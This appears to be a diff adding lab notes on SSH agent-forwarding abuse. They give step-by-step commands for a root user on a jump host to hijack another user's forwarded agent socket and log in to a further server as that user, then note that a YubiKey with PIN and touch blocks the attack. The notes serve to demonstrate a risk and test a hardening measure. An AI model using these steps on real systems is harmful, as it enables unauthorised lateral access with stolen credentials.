@@ -1,0 +1,27 @@
+
+# assume the attacker has already compromised the remote host and elevated privileges
+___________________________________________________________________________________
+BASE SYSTEM (Linux-Base)
+___________________________________________________________________________________
+as larry:
+1. eval `ssh-agent` 
+2. ssh-add ./.ssh/id_rsa
+the agent now has access to the key, it creates a tmp file that is a socket to the agent
+3. ssh Linux-Base-Jump -A
+this will forward the agent with the ssh connection to the remote computer
+
+------------------------------------------------------------------------------------
+REMOTE SYSTEM (Linux-Base-Jump)
+------------------------------------------------------------------------------------
+as ansible su to root:
+1. ls /tmp | grep ssh
+2. export SSH_AUTH_SOCK=/tmp/ssh-XXXXXXXXX/agent.YYY (replace the X and Y with the actual numbers)
+3. ssh larry@Linux-Base-Server.sshlab -v
+
+Notice that an elevated attacker on a remote host now has access to any machines the user's key can authenticate to because the user forwarded the agent.
+
+_________________________________________________________________________________________________
+HARDENED SYSTEM
+_________________________________________________________________________________________________
+
+*this test is the same on the hardened system as test 3, the forwarded agent still requires unlocking the Yubikey with pin and touch.
